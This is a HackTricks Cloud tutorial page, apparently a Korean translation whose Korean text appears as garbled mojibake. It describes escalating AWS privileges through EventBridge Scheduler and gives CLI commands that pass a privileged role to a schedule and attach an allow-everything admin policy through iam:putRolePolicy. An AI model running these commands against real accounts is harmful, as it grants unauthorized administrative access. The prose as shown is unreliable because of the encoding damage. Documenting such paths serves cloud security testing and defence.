# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge SchedulerëŠ” ë‹¤ì–‘í•œ AWS ì„œë¹„ìŠ¤ì— ëŒ€í•œ í˜¸ì¶œì„ ì˜ˆì•½í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì— ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆì•½ëœ ë°©ì‹ìœ¼ë¡œ ì„œë¹„ìŠ¤ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ í™œìš©í•˜ì—¬ ì¶©ë¶„í•œ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. EventBridge Schedulerê°€ í…œí”Œë¦¿ ëŒ€ìƒ ì‚¬ìš©í•˜ì—¬ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆëŠ” ì£¼ìš” ì‘ì—…ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* Lambda: lambda:InvokeFunction - ì˜ˆì•½ëœ Lambda í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
* CodeBuild: codebuild:StartBuild - AWS CodeBuild í”„ë¡œì íŠ¸ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤.
* CodePipeline: codepipeline:StartPipelineExecution - AWS CodePipeline ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•©ë‹ˆë‹¤.
* ECS: ecs:RunTask - ECS ì‘ì—…ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
* EventBridge: events:PutEvents - EventBridgeì— ì´ë²¤íŠ¸ë¥¼ ë„£ìŠµë‹ˆë‹¤.
* Inspector: inspector:StartAssessmentRun - Amazon Inspector í‰ê°€ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤.
* Kinesis: kinesis:PutRecord - Kinesis ìŠ¤íŠ¸ë¦¼ì— ë ˆì½”ë“œë¥¼ ë„£ìŠµë‹ˆë‹¤.
* Firehose: firehose:PutRecord - Firehose ë°°ë‹¬ ìŠ¤íŠ¸ë¦¼ì— ë ˆì½”ë“œë¥¼ ë„£ìŠµë‹ˆë‹¤.
* SageMaker: sagemaker:StartPipelineExecution - SageMaker íŒŒì´í”„ë¼ì¸ ì‹¤í–‰ì„ ì‹œì‘í•©ë‹ˆë‹¤.
* SNS: sns:Publish - SNS ì£¼ì œì— ë©”ì‹œì§€ë¥¼ ê²Œì‹œí•©ë‹ˆë‹¤.
* SQS: sqs:SendMessage - SQS íì— ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤.
* Step Functions: states:StartExecution - AWS Step Functionsì˜ ì‹¤í–‰ì„ ì‹œì‘í•©ë‹ˆë‹¤.

ì´ë“¤ì€ EventBridge Schedulerê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” í…œí”Œë¦¿ ì‘ì—… ì¤‘ ì¼ë¶€ì— ë¶ˆê³¼í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë²”ìš© ëŒ€ìƒì„ ì‚¬ìš©í•˜ë©´ AWS ì„œë¹„ìŠ¤ ì „ë°˜ì— ê±¸ì³ ë§ì€ ë‹¤ë¥¸ ì‘ì—…ì„ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë²”ìš© ëŒ€ìƒì€ í…œí”Œë¦¿ ëª©ë¡ì„ ë„˜ì–´ ë” ê´‘ë²”ìœ„í•œ API ì‘ì—…ì„ í—ˆìš©í•©ë‹ˆë‹¤.

EventBridge Schedulerì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

`sts:AssumeRole`, `iam:PassRole`, ë° `scheduler:CreateSchedule or scheduler:UpdateSchedule` ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìëŠ” EventBridge Schedulerë¥¼ í™œìš©í•˜ì—¬ ë” ë†’ì€ ê¶Œí•œì„ ê°€ì§„ ì—­í• ì„ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ë¥¼ í˜¸ì¶œí•¨ìœ¼ë¡œì¨ ê¶Œí•œì„ ìƒìŠ¹ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ê¶Œí•œì„ í†µí•´ ê³µê²©ìëŠ” ê¶Œí•œì´ ìƒìŠ¹ëœ ì—­í• ì„ ê°€ì •í•˜ê³ , ì¼ì •ì„ ìƒì„±í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•  ë•Œ ê·¸ ì—­í• ì„ EventBridge Schedulerì— ì „ë‹¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ì •ì€ ì´ì „ì— ë‚˜ì—´ëœ ì‘ì—… ì¤‘ ì–´ë–¤ ê²ƒì´ë“  ìˆ˜í–‰í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆìœ¼ë©°, Lambda í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ê±°ë‚˜, ECS ì‘ì—…ì„ ì‹œì‘í•˜ê±°ë‚˜, CodePipeline ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•˜ê±°ë‚˜, EventBridge Schedulerì—ì„œ ì§€ì›í•˜ëŠ” 270ê°œì˜ AWS ì„œë¹„ìŠ¤ì˜ ì–´ë–¤ ì‘ì—…ì´ë“  ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‘ì—…ì„ ì˜ˆì•½í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ë” ë†’ì€ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ AWS ì„œë¹„ìŠ¤ ì „ë°˜ì— ê±¸ì³ ë¬´ë‹¨ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. \\

ì˜ˆë¥¼ ë“¤ì–´, ê·¸ë“¤ì€ ì¼ì •ì„ êµ¬ì„±í•˜ì—¬ í…œí”Œë¦¿ ì‘ì—…ì¸ Lambda í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
EventBridge Schedulerì—ì„œ í…œí”Œë¦¿ ì„œë¹„ìŠ¤ ì‘ì—… ì™¸ì—ë„ ë‹¤ì–‘í•œ AWS ì„œë¹„ìŠ¤ì— ëŒ€í•œ ê´‘ë²”ìœ„í•œ API ì‘ì—…ì„ í˜¸ì¶œí•˜ê¸° ìœ„í•´ ìœ ë‹ˆë²„ì„¤ ëŒ€ìƒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìœ ë‹ˆë²„ì„¤ ëŒ€ìƒì€ ê±°ì˜ ëª¨ë“  APIë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ìœ ì—°ì„±ì„ ì œê³µí•©ë‹ˆë‹¤. í•œ ê°€ì§€ ì˜ˆëŠ” "putRolePolicy" ì •ì±…ì´ ìˆëŠ” ì—­í• ì„ ì‚¬ìš©í•˜ì—¬ "AdminAccessPolicy"ë¥¼ ì¶”ê°€í•˜ëŠ” ìœ ë‹ˆë²„ì„¤ ëŒ€ìƒì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## References

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
